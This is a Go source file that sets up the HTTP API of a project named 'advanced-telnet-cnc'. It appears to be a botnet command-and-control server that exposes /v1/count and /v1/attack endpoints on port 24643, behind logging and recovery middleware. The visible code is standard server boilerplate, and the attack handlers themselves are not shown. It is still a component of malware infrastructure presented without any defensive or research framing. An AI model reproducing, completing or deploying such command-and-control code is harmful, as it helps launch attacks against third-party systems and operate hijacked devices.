package api

import (
	"advanced-telnet-cnc/source/api/routes"
	"advanced-telnet-cnc/source/config"
	"net/http"
)

func Serve() {
	mux := http.NewServeMux()
	mux.HandleFunc("/v1/count", routes.Count)
	mux.HandleFunc("/v1/attack", routes.Attack)

	handler := recoveryMiddleware(loggingMiddleware(mux))

	config.Logger.Info("API server starting", "port", 24643)
	err := http.ListenAndServe(":24643", handler)
	if err != nil {
		config.Logger.Error("API server failed", "err", err)
	}
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		config.Logger.Info("API request", "method", r.Method, "path", r.URL.Path, "remote", r.RemoteAddr)
		next.ServeHTTP(w, r)
	})
}

func recoveryMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if err := recover(); err != nil {
				config.Logger.Error("API panic recovered", "err", err)
				w.WriteHeader(http.StatusInternalServerError)
			}
		}()
		next.ServeHTTP(w, r)
	})
}
